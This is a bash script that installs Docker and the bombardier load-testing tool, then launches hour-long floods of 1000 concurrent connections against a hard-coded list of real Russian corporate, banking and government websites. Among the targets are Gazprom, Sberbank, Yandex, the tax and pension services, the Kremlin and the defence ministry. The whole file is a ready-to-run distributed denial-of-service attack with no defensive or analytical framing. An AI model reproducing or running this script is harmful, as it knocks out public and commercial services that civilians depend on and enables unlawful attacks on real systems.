setTerminalTitle() {
  if [[ -z "$ORIG" ]]; then
    ORIG=$PS1
  fi
  TITLE="\[\e]2;$*\a\]"
  PS1=${ORIG}${TITLE}
}

export -f setTerminalTitle

bombard(){
    echo "LETS BOMB SOME SHITT M8 '$2'"
    gnome-terminal -x bash -c "setTerminalTitle bombing-'$2' && echo bombing-'$2' && docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l '$1'; exec bash"
}


result=$( docker images -q alpine/bombardier )

if [[ -n "$result" ]]; then
  echo "Docker Container already exists"
else
  echo "No such container"
  if brew ls --versions > /dev/null; then
    echo "brew already installed"
    brew install --cask docker
    docker pull alpine/bombardier
  else
    echo "The package is not installed"
    ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
  fi
fi




bombard https://www.gazprom.ru/ "Газпром"
bombard https://lukoil.ru "Лукойл"
bombard https://magnit.ru/ "Магнит"
bombard https://www.surgutneftegas.ru/ "Сургетнефтегаз"
bombard https://www.tatneft.ru/ "Татнефть"
bombard https://www.evraz.com/ru/ "Евраз"
bombard https://nlmk.com/ "НЛМК"
bombard https://www.severstal.com/ "Северсталь"
bombard https://www.metalloinvest.com/ "Металлоинвест"
bombard https://nangs.org/ "ННК"
bombard https://www.tmk-group.ru/ "ТМК"
bombard https://ya.ru/ "Яндекс"
bombard https://www.polymetalinternational.com/ru/ "Polymetal"
bombard https://www.uralkali.com/ru/ "Уралкалий"
bombard https://www.eurosib.ru/ "Евросибэнерго"
bombard https://omk.ru "ОМК"
bombard https://www.sberbank.ru "Сбербанк"
bombard https://www.vtb.ru/ "ВТБ"
bombard https://www.gazprombank.ru/ "Газпромбанк"
bombard https://www.gosuslugi.ru/ "Госуслуги"
bombard https://www.nalog.gov.ru/ "Налоговая"
bombard https://customs.gov.ru/ "Таможня"
bombard https://rkn.gov.ru/ "Роскомнадзор"
bombard https://epp.genproc.gov.ru/ "Genproc"
bombard https://ach.gov.ru/ "Ach"
bombard http://www.scrf.gov.ru/ "Scrf"
bombard https://pda.mil.ru "Mil"
bombard https://www.nornickel.com/ "Норильский никель"
bombard https://www.sibur.ru/ "Сибур Холинг"
bombard https://rmk-group.ru/ru/ "Русская медная компания"
bombard https://www.mos.ru/uslugi/ "Госуслуги Москвы"
bombard http://kremlin.ru/ "Президента РФ" 
bombard http://government.ru/ "Правительства РФ"
bombard https://mil.ru/ "Министерство обороны"
bombard https://pfr.gov.ru/ "Пенсионный фонд"



